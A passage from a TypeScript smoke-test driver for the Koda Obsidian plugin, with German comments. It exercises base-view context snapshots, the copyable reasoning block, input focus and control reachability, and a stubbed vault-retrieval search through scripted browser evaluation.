          if (bereit === null) return `Übernehmen-Knopf in ${pfad} nicht binnen 10 s bereit`;
          await cdp.evaluate(`document.querySelector(".workspace-leaf.mod-active .koda-bases-view .koda-bases-adopt").click(); return true;`);
          return null;
        };
        const ARBEIT_OK = ["---", "koda: arbeit", 'base: "Notes/Koda two views.base#Second view"', "---", "Smoke 88.", ""].join("\n");
        const ARBEIT_FALSCH = ["---", "koda: arbeit", 'base: "Notes/Overview.base#All notes"', "---", "Smoke 88 falsch.", ""].join("\n");
        const zustand = { gesichert: false };
        try {
          await cdp.evaluate(`
            const p = ${PL};
            window.__kodaSmoke86 = { session: JSON.stringify(p.session), mode: p.contextMode };
            const ensure = async (d) => { if (!app.vault.getFolderByPath(d)) await app.vault.createFolder(d); };
            const mk = async (path, content) => { const f = app.vault.getFileByPath(path); if (f) await app.vault.modify(f, content); else await app.vault.create(path, content); };
            await ensure("Koda"); await ensure("Koda/Arbeiten");
            await mk("Koda/Arbeiten/Smoke Base.md", ${JSON.stringify(ARBEIT_OK)});
            await mk("Koda/Arbeiten/Smoke Base falsch.md", ${JSON.stringify(ARBEIT_FALSCH)});
            p.chooseArbeit(null);
            p.resetOverlay();
            p.resetContextSelection();
            p.refreshArbeiten();
            return true;`);
          zustand.gesichert = true;
          await schliesseBases();

          // 86 ── Tabelle, Default aus dem Lesecode, fehlender Wert leer.
          let ok86 = false; let detail86 = "";
          try {
            const fehler = await adoptFrom("Notes/Koda context.base");
            if (fehler !== null) throw new Error(fehler);
            const r = await cdp.evaluate<{ bases: { id: string; form: string; rows: number; columns: string[] }[]; text: string; items: string[] }>(`
              const p = ${PL};
              p.setContextMode("workspace");
              const ctx = await p.currentContext();
              return {
                bases: p.contextBases.map((b) => ({ id: b.id, form: b.form, rows: b.rows.length, columns: b.columns })),
                text: ctx?.text ?? "",
                items: (ctx?.items ?? []).map((i) => i.source + ":" + i.kind),
              };`);
            const b = r.bases[0];
            const tabelle = r.text.slice(Math.max(0, r.text.indexOf("## Base:")));
            ok86 = r.bases.length === 1 && b !== undefined && b.id === ID_TABELLE && b.form === "table" && b.rows === 4
              && r.items.includes("base:table") && /\| Notes\/Tools\.md \| Tools \| active \|\s*\|/.test(tabelle) && !/\bnull\b/.test(tabelle);
            detail86 = `Schnappschuss ${b?.id ?? "—"} · Form ${b?.form ?? "—"} · ${String(b?.rows)} Zeilen (soll 4) · Zeile Tools mit leerer Spalte owner: ${String(/\| Notes\/Tools\.md \| Tools \| active \|\s*\|/.test(tabelle))} · Spalten ${b?.columns.join(", ") ?? "—"} · „null“ in der Tabelle: ${String(/\bnull\b/.test(tabelle))}`;
          } catch (error) { abbruch(P86, error); }
          if (detail86 !== "") record(P86, ok86, detail86);

          // 87 ── Übergabeform „Notizen“ (steht im Feld der Ansicht).
          let ok87 = false; let detail87 = "";
          try {
            const fehler = await adoptFrom("Notes/Koda notes.base");
            if (fehler !== null) throw new Error(fehler);
            const r = await cdp.evaluate<{ form: string; items: string[]; hatTabelle: boolean; n: number }>(`
              const p = ${PL};
              p.setContextMode("tabs");
              const ctx = await p.currentContext();
              const notes = p.contextBases.find((b) => b.viewName === "Context notes");
              return {
                form: notes?.form ?? "", n: p.contextBases.length,
                items: (ctx?.items ?? []).map((i) => i.source + ":" + i.path + ":" + i.kind),
                hatTabelle: (ctx?.text ?? "").includes("· Context notes ("),
              };`);
            const baseVolltext = r.items.filter((i) => i.startsWith("base:") && i.endsWith(":full"));
            // Zwei Ansichten nacheinander: beide Schnappschüsse stehen da (ID aus Pfad UND Ansicht), keiner überschreibt den anderen.
            ok87 = r.form === "notes" && r.n === 2 && baseVolltext.length >= 1 && !r.hatTabelle;
            detail87 = `Form ${r.form} · Schnappschüsse ${r.n} (soll 2) · Volltext aus Base: ${baseVolltext.join(", ") || "keiner"} · Tabelle der Notizen-Ansicht im Block: ${String(r.hatTabelle)}`;
          } catch (error) { abbruch(P87, error); }
          if (detail87 !== "") record(P87, ok87, detail87);
          await cdp.evaluate(`const p = ${PL}; p.resetContextSelection(); p.setContextMode("workspace"); return true;`);
          await schliesseBases();

          // 88 ── Base in der Arbeit.
          try {
            // (a) richtige Ansicht: die Arbeit öffnet die Base, die Ansicht übernimmt selbst.
            await cdp.evaluate(`const p = ${PL}; p.chooseArbeit("Smoke Base"); return true;`);
            const a = await pollUntil<{ ids: string[]; pending: boolean; notice: boolean }>(cdp, `
              const p = ${PL};
              const ids = p.contextBases.map((b) => b.id);
              const notice = [...document.querySelectorAll(".notice")].some((n) => n.textContent.includes("aus der Arbeit") || n.textContent.includes("from the task"));
              return ids.includes(${JSON.stringify(ID88)}) ? { ids, pending: p.pendingBase !== null, notice } : null;`, 10_000, 100);
            // (b) Ansicht fremden Typs: kein neuer Tab, Hinweis im Tab.
            await cdp.evaluate(`const p = ${PL}; p.chooseArbeit(null); p.resetContextSelection(); return true;`);
            await schliesseBases();
            const vorher = await basesBlaetter();
            await cdp.evaluate(`const p = ${PL}; p.chooseArbeit("Smoke Base falsch"); return true;`);
            const hinweis = await pollUntil<string[]>(cdp, `
              const h = await ${PL}.arbeitHints();
              return h.some((x) => x.includes("nicht vom Typ") || x.includes("not of type")) ? h : null;`, 10_000, 200);
            await pause(800);
            const nachher = await basesBlaetter();
            const pendingFalsch = await cdp.evaluate<boolean>(`return ${PL}.pendingBase !== null;`);
            // (c) „Neues Gespräch“ mit der Arbeit: die Schnappschüsse des alten Gesprächs sind weg, die Base wird frisch übernommen.
            await cdp.evaluate(`const p = ${PL}; p.chooseArbeit(null); p.resetContextSelection(); return true;`);
            await schliesseBases();
            await cdp.evaluate(`const p = ${PL}; p.chooseArbeit("Smoke Base"); return true;`);
            const erst = await pollUntil<string>(cdp, `const b = ${PL}.contextBases.find((x) => x.id === ${JSON.stringify(ID88)}); return b ? b.takenAt : null;`, 10_000, 100);
            await cdp.evaluate(`await ${PL}.newChat(); return true;`);
            const danach = await pollUntil<{ n: number; takenAt: string; pending: boolean }>(cdp, `
              const p = ${PL};
              const b = p.contextBases.find((x) => x.id === ${JSON.stringify(ID88)});
              return b ? { n: p.contextBases.length, takenAt: b.takenAt, pending: p.pendingBase !== null } : null;`, 10_000, 100);
            const okA = a !== null && a.ids.length === 1 && !a.pending && a.notice;
            const okB = hinweis !== null && nachher === vorher && !pendingFalsch;
            const okC = erst !== null && danach !== null && danach.n === 1 && !danach.pending && danach.takenAt >= erst;
            record(P88, okA && okB && okC,
              `(a) Schnappschuss ${a === null ? "nicht übernommen" : `${a.ids.join(", ")}`} · wartet noch: ${String(a?.pending)} · Notice „aus der Arbeit“: ${String(a?.notice)}`
              + ` · (b) Hinweis ${hinweis === null ? "fehlt" : `„${hinweis.find((x) => x.includes("nicht vom Typ") || x.includes("not of type"))}“`}, Base-Tabs ${vorher} → ${nachher}, wartet noch: ${String(pendingFalsch)}`
              + ` · (c) nach „Neues Gespräch“ ${danach === null ? "nichts" : `${danach.n} Schnappschuss, Stand ${danach.takenAt} (vorher ${erst ?? "—"}), wartet noch: ${String(danach.pending)}`}`);
          } catch (error) { abbruch(P88, error); }
        } catch (error) {
          for (const n of [P86, P87, P88] as const) abbruch(n, error);
        } finally {
          await schliesseBases().catch(() => undefined);
          await cdp.evaluate(`
            const p = ${PL};
            for (const pfad of ["Koda/Arbeiten/Smoke Base.md", "Koda/Arbeiten/Smoke Base falsch.md"]) {
              const f = app.vault.getFileByPath(pfad); if (f) await app.vault.delete(f);
            }
            const rest = window.__kodaSmoke86;
            if (rest) {
              p.chooseArbeit(null);
              p.resetContextSelection();
              p.session = JSON.parse(rest.session);
              p.setContextMode(rest.mode);
              delete window.__kodaSmoke86;
            }
            p.refreshArbeiten();
            return true;`).catch(() => undefined);
          void zustand;
        }
      }

      // --- 89–91. Denkblock nach der Antwort und Kopier-Knopf (Welle 24) ----
      {
        const PL = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
        const pause = (ms: number): Promise<void> => new Promise((r) => setTimeout(r, ms));
        const abbruch = (name: (typeof PUNKTE)[number], error: unknown): void => unmeasured(name, `Abbruch: ${error instanceof Error ? error.message : String(error)}`);
        const P89 = "89. Denkblock nach der Antwort: zugeklappt vor der Antwort, mit der Sitzung im JSONL, nie am Draht; der Schalter „Denken aufbewahren“ aus lässt ihn verschwinden";
        const P90 = "90. Denkblock kopierbar während des Stroms (Kit-Knopf): der Klick kopiert den bisherigen Denktext und klappt den Block nicht zu";
        const P91 = "91. Denkblock kopierbar nach der Antwort: der Klick kopiert den ganzen Denktext, quittiert mit is-copied und klappt den Block nicht auf";
        const P100 = "100. Gegenprobe Denkblock kopierbar nach der Antwort: lehnt die Zwischenablage den Schreibversuch ab, quittiert der Knopf nicht";
        const P101 = "101. Gegenprobe Denkblock kopierbar während des Stroms: lehnt die Zwischenablage den Schreibversuch ab, quittiert der Knopf nicht";
        const GEDANKE = "Ich wäge die Quellen ab und prüfe dann den Kontext. GEDANKE-89.";
        const chatZeigen = (): Promise<unknown> => cdp.evaluate(`
          const p = ${PL};
          if (p.views().length === 0) await p.activateView();
          app.commands.executeCommandById(${JSON.stringify(PLUGIN_ID + ":tab-chat")});
          return true;`);
        const saveVorher = await cdp.evaluate<boolean>(`return ${PL}.settings.saveThinking;`);
        const stub89 = await startLlmStub({ models: ["smoke-model"], standard: { reasoning: GEDANKE, text: "Antwort 89." } });
        try {
          await setzeModell("smoke-model", stub89.url);
          await chatZeigen();
          await pause(400);
          await cdp.evaluate(`const p = ${PL}; await p.newChat(); p.settings.saveThinking = true; return true;`);
          await cdp.evaluate(`await ${PL}.ask("Smoke 89: denke nach"); return true;`);
          const erste = await cdp.evaluate<{ n: number; offen: boolean | null; text: string; vorAntwort: boolean; imVerlauf: boolean; imJsonl: boolean }>(`
            const p = ${PL};
            const det = [...document.querySelectorAll(".koda-log details.koda-thinking")];
            const d = det[0];
            const assistant = p.chatLog.filter((m) => m.role === "assistant");
            const raw = await app.vault.adapter.read(p.manifest.dir + "/sessions/current.jsonl");
            const imJsonl = raw.split("\\n").filter((z) => z.trim() !== "").map((z) => JSON.parse(z)).some((m) => m.thinking === ${JSON.stringify(GEDANKE)});
            return {
              n: det.length, offen: d ? d.open : null, text: d?.querySelector("pre")?.textContent ?? "",
              vorAntwort: !!(d && d.nextElementSibling && d.nextElementSibling.classList.contains("koda-assistant")),
              imVerlauf: assistant[assistant.length - 1]?.thinking === ${JSON.stringify(GEDANKE)}, imJsonl,
            };`);

          // 91 und 100. (an der Antwort aus 89) Kopier-Knopf nach dem Antwortende: Baustein der Bruecke (`messeDenkblockKopierbar`), der die
          // Zwischenablage aufzeichnet und den vorgefundenen Deskriptor zurueckstellt; die Gegenprobe lehnt `writeText` ab.
          try {
            const dk = await messeDenkblockKopierbar(cdp, {
              block: ".koda-log details.koda-thinking", knopf: ".koda-log details.koda-thinking .okit-stream-reasoning-copy", enthaelt: "GEDANKE-89", erwartetKnopf: true,
            });
            zeichnePflicht(bilanz, P91, dk.kopie);
            zeichnePflicht(bilanz, P100, dk.gegen);
          } catch (error) { abbruch(P91, error); abbruch(P100, error); }

          // 89 weiter: zweite Frage (Draht ohne Denken), dann der Schalter aus.
          await cdp.evaluate(`await ${PL}.ask("Smoke 89: zweite Frage"); return true;`);
          const chats = stub89.anfragen().filter((a) => a.route === "chat");
          const amDraht = (chats[chats.length - 1]?.body ?? "").includes("GEDANKE-89");
          const nZwei = await cdp.evaluate<number>(`return document.querySelectorAll(".koda-log details.koda-thinking").length;`);
          await cdp.evaluate(`const p = ${PL}; p.settings.saveThinking = false; await p.ask("Smoke 89: ohne Aufbewahren"); for (const v of p.views()) v.renderLog(); return true;`);
          const nOhne = await cdp.evaluate<number>(`return document.querySelectorAll(".koda-log details.koda-thinking").length;`);
          record(P89,
            erste.n === 1 && erste.offen === false && erste.text === GEDANKE && erste.vorAntwort && erste.imVerlauf && erste.imJsonl && !amDraht && nZwei === 2 && nOhne === 2,
            `nach der Antwort ${erste.n} Block, zu: ${erste.offen === false}, Text gleich: ${erste.text === GEDANKE}, vor der Antwort: ${erste.vorAntwort} · im Verlauf ${erste.imVerlauf}, im JSONL ${erste.imJsonl} · Denken im Request der 2. Frage: ${amDraht} (soll nein) · nach 2. Frage ${nZwei} Blöcke · Schalter aus → ${nOhne} (soll 2)`);
        } catch (error) { abbruch(P89, error); abbruch(P91, error); abbruch(P100, error); } finally {
          await cdp.evaluate(`const p = ${PL}; p.settings.saveThinking = ${JSON.stringify(saveVorher)}; await p.newChat(); return true;`).catch(() => undefined);
          await stub89.stop();
        }

        // 90 und 101. Kopier-Knopf WAEHREND des Stroms (der Knopf aus dem Kit-Stream-Bereich). Der Stub haelt die Antwort nach dem letzten Stueck
        // zwoelf Sekunden offen: der Baustein klickt, wartet das Ende der Quittung ab und macht dann die Gegenprobe — ohne diese Haltezeit
        // waere der Strom dazwischen zu Ende und die Gegenprobe „nichts gemessen“.
        const LANG90 = "Ich ueberlege Schritt fuer Schritt, was zu tun ist. ".repeat(12);
        const stub90 = await startLlmStub({ models: ["smoke-model"], takt: 250, nachlaufMs: 12_000, standard: { reasoning: LANG90, laenge: 40, text: "Fertig 90." } });
        try {
          await setzeModell("smoke-model", stub90.url);
          await chatZeigen();
          await cdp.evaluate(`void ${PL}.ask("Smoke 90: denke nach."); return true;`);
          const live = await pollUntil<{ vorher: boolean }>(cdp, `
            const d = document.querySelector(".koda-streaming .okit-stream-reasoning");
            const b = d?.querySelector(".okit-stream-reasoning-copy");
            const pre = d?.querySelector("pre");
            return b && pre && pre.textContent.length > 60 ? { vorher: d.open } : null;`, 10_000, 200);
          if (live !== null) {
            const dk = await messeDenkblockKopierbar(cdp, {
              block: ".koda-streaming .okit-stream-reasoning", knopf: ".koda-streaming .okit-stream-reasoning-copy", enthaelt: "Ich ueberlege Schritt fuer Schritt", erwartetKnopf: true,
            });
            zeichnePflicht(bilanz, P90, dk.kopie);
            zeichnePflicht(bilanz, P101, dk.gegen);
          } else {
            for (const n of [P90, P101] as const) unmeasured(n, "der Denkblock im Strom erschien nicht binnen 10 s — es gibt nichts zu kopieren");
          }
          await pollUntil<boolean>(cdp, `return ${PL}.busy ? null : true;`, 30_000, 200);
        } catch (error) { abbruch(P90, error); abbruch(P101, error); } finally {
          await cdp.evaluate(`await ${PL}.newChat(); return true;`).catch(() => undefined);
          await stub90.stop();
        }
      }

      // --- 92–96. Pflichtpunkte fuer Views mit Ausgabebereich (Skill gui-smoke-setup 3a, Brueckenbaustein pflichtpunkte.ts) ----
      {
        const PL = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
        const N92 = "92. Pflichtpunkt Fokus: ein getippter Text im Eingabefeld überlebt ein Neuzeichnen, das Feld behält den Fokus";
        const N93 = "93. Gegenprobe Fokus: ein Neuzeichnen mit Fokusverlust macht Punkt 92 rot";
        const N94 = "94. Pflichtpunkt Erreichbarkeit: jedes Bedienelement des Chats ist bei langem Verlauf noch zu treffen (Mitte per elementFromPoint)";
        const N95 = "95. Pflichtpunkt Erreichbarkeit im kurzen Panel (420 px Höhe)";
        const N96 = "96. Gegenprobe Erreichbarkeit: ohne Rollbalken am Verlauf wird ein Bedienelement unerreichbar";
        try {
          await cdp.evaluate(`const p = ${PL}; if (p.views().length === 0) await p.activateView(); app.commands.executeCommandById(${JSON.stringify(PLUGIN_ID + ":tab-chat")}); return true;`);
          await new Promise((r) => setTimeout(r, 500));
          const fokus = { selector: ".koda-input" };
          zeichnePflicht(bilanz, N92, await messeFokusErhalt(cdp, fokus));
          zeichnePflicht(bilanz, N93, await gegenprobeFokus(cdp, fokus));
          // Die Bedienelemente des Chats. `.koda-header-action` und die Hub-Tabs liegen ueber dem Verlauf, Senden/Stopp/Modus darunter.
          const erreichbar = {
            selektoren: [".koda-input", ".koda-buttons button", ".koda-mode", ".koda-header-action", ".okit-hub-tab"],
            nurErster: [".koda-mode"],
            erforderlich: [".koda-input", ".koda-buttons button"],
            fuelle: { in: ".koda-log", zeilen: 120 },
            ueberlauf: ".koda-log",
          };
          zeichnePflicht(bilanz, N94, await messeErreichbarkeit(cdp, erreichbar));
          zeichnePflicht(bilanz, N95, await mitHoehe(cdp, { element: ".workspace-leaf", enthaelt: ".koda-root", hoehe: 420 }, () => messeErreichbarkeit(cdp, erreichbar)) as PflichtTeilurteil);
          // Die Gegenprobe darf nur gruen heissen, wenn sie ROT werden KONNTE. Liegen alle Bedienelemente ausserhalb des Rollbereichs
          // (hier: Eingabe und Knoepfe unter dem Verlauf), nimmt ihm der Rollbalken nichts weg — dann ist der Punkt „nicht anwendbar“, mit dem Grund.
          const gegen = await gegenprobeErreichbarkeit(cdp, erreichbar);
          if (gegen.urteil === "gruen") bilanz.record(N96, true, gegen.detail);
          else skipped(N96, `in diesem Layout nicht anwendbar — ${gegen.detail}`);
        } catch (error) {
          for (const n of [N92, N93, N94, N95, N96] as const) unmeasured(n, `Abbruch: ${error instanceof Error ? error.message : String(error)}`);
        }
      }

      // --- 98–99. Handpunkte 17 und 18 des Retrieval-Smokes, an der Naht (Welle 24) ----
      // Die Handpunkte verlangen den Eingriff in geteilte Dienste (Ollama stoppen, vault-rag deaktivieren). Hier wird Kodas Seite der Naht
      // gemessen: die Antwort der vault-rag-API ist ein Stub (`offline` bzw. kein Eintrag), `search_notes` laeuft ueber DENSELBEN Weg wie im Chat.
      // Ein echtes vault-rag und ein echter Embedding-Dienst sind damit NICHT belegt.
      {
        const PL = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
        const P98 = "98. Handpunkt 17 an der Naht: ist der Embedding-Endpunkt nicht erreichbar, stehen die Volltext-Treffer UND die Zeile „(semantisch: Embedding-Endpunkt nicht erreichbar …)“ im Ergebnis; erreichbar fehlt die Zeile";
        const P99 = "99. Handpunkt 18 an der Naht: ohne vault-rag keine semantische Beschriftung; mit dem Stub ist sie da, und Koda traegt related_notes nie selbst (es kommt nur ueber einen Anbieter, Punkt 78)";
        const vorhanden = await cdp.evaluate<boolean>(`return !!app.plugins.plugins["vault-retrieval"];`);
        if (vorhanden) {
          const grund = "uebersprungen — ein vault-retrieval-Eintrag existiert bereits (echtes Plugin oder Rest eines abgebrochenen Laufs); Stub wuerde ihn ueberschreiben";
          record(P98, true, grund);
          record(P99, true, grund);
        } else {
          const stubAn = (aus: boolean): Promise<unknown> => cdp.evaluate(`
            window.__kodaRag98 = { fail: ${aus} };
            app.plugins.plugins["vault-retrieval"] = {
              __kodaSmokeStub: true,
              api: {
                apiVersion: 1,
                status: () => ({ apiVersion: 1, indexed: true, noteCount: 4, reindexing: false }),
                search: async () => window.__kodaRag98.fail ? { ok: false, reason: "offline" } : { ok: true, hits: [{ path: "Notes/Compaction.md", score: 0.9 }] },
                related: async () => ({ ok: true, hits: [{ path: "Koda/Memory.md", score: 0.8 }] }),
              },
            };
            return true;`);
          const suche = (): Promise<string> => cdp.evaluate<string>(`const r = await ${PL}.buildTools().run("search_notes", { query: "Compaction" }); return r.ok ? r.content : "FEHLER: " + r.error;`);
          const namen = (): Promise<string[]> => cdp.evaluate<string[]>(`return ${PL}.currentToolNames();`);
          // Der semantische Teil zeigt sich als Score hinter dem Volltext-Treffer „(0.90)“ oder als Block „Inhaltlich ähnlich“ (ein Treffer, der auch
          // wörtlich gefunden wurde, steht nicht zweimal da).
          const semantisch = (t: string): boolean => /\(0\.90\)|Inhaltlich ähnlich/.test(t);
          try {
            // 99, Teil 1: kein Eintrag — der Zustand jedes Store-Nutzers ohne vault-rag.
            const ohneText = await suche();
            const ohneNamen = await namen();
            // 98: Stub mit „offline“, dann erreichbar (Gegenprobe: die Zeile verschwindet).
            await stubAn(true);
            const offText = await suche();
            await cdp.evaluate(`window.__kodaRag98.fail = false; return true;`);
            const anText = await suche();
            const mitNamen = await namen();
            record(P98,
              offText.includes("Compaction") && offText.includes("(semantisch: Embedding-Endpunkt nicht erreichbar") && !anText.includes("Embedding-Endpunkt nicht erreichbar"),
              `offline: Volltext-Treffer ${offText.includes("Compaction")} · Hinweiszeile ${offText.includes("(semantisch: Embedding-Endpunkt nicht erreichbar")} · erreichbar: Zeile weg ${!anText.includes("Embedding-Endpunkt nicht erreichbar")}, semantischer Teil ${semantisch(anText)}`);
            record(P99,
              !semantisch(ohneText) && !ohneNamen.includes("related_notes") && !mitNamen.includes("related_notes") && semantisch(anText),
              `ohne vault-rag: semantischer Teil ${semantisch(ohneText)} (soll nein) · related_notes ${ohneNamen.includes("related_notes")} (soll nein) · mit Stub (nur die Retrieval-API, kein Werkzeug-Vertrag): related_notes ${mitNamen.includes("related_notes")} (soll nein), semantischer Teil ${semantisch(anText)} (soll ja)`);
          } catch (error) {
            for (const n of [P98, P99] as const) unmeasured(n, `Abbruch: ${error instanceof Error ? error.message : String(error)}`);
          } finally {
            await cdp.evaluate(`if (app.plugins.plugins["vault-retrieval"]?.__kodaSmokeStub) delete app.plugins.plugins["vault-retrieval"]; delete window.__kodaRag98; return true;`).catch(() => undefined);
          }
        }
      }
    } finally {
      await cdp.evaluate(`
        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
        p.setContextMode(${JSON.stringify(modusVorher59)});
        await p.saveSettings();
        return true;
      `).catch(() => undefined);
    }
  } finally {
    // Aufräumen darf nie am Ergebnis hängen: auch ein abgebrochener Lauf gibt die
    // EINSTELLUNGEN so zurück, wie er sie vorgefunden hat — sonst bleiben tote Endpunkte
    // beim Maintainer stehen.
    //
    // Was hier NICHT wiederhergestellt wird, und das ist Absicht: das laufende Gespräch.
    // Punkt 5 braucht ein frisches (`newChat()` vor dem Failover-Versuch), und der Aufruf
    // hier räumt dessen Fehlermeldung wieder weg. Der vorherige Verlauf ist damit aus der
    // Sidebar verschwunden — nicht verloren: `SessionStore.startNew()` hängt ihn an
    // `sessions/archive.jsonl`, bevor es `current.jsonl` leert. Wer also mitten in einem Gespräch
    // den Smoke fährt, findet danach ein leeres. Gemessen am 2026-08-24: ein Smoke zwischen
    // zwei Messungen kostete den Verlauf, an dem gerade gemessen wurde.
    // Ein echtes Zurückschreiben wäre mehr Mechanik, als der Fall wert ist — die Warnung
    // im Kopfkommentar ist der billigere Weg.
    await zustand?.schliesse();
    await fake?.close();
    // Nach Ctrl-C druckt das Modul die Bilanz und beendet den Prozess selbst.
    if (istAbgebrochen()) return;
    cdp.close();
    // Auch nach einem Abbruch: nie aufgezeichnete Punkte zaehlen als „nichts gemessen“.
    abschluss();
    for (const w of herkunftsWarnungen) console.log(`\n${w}`);
  }
}

runDriver(main);
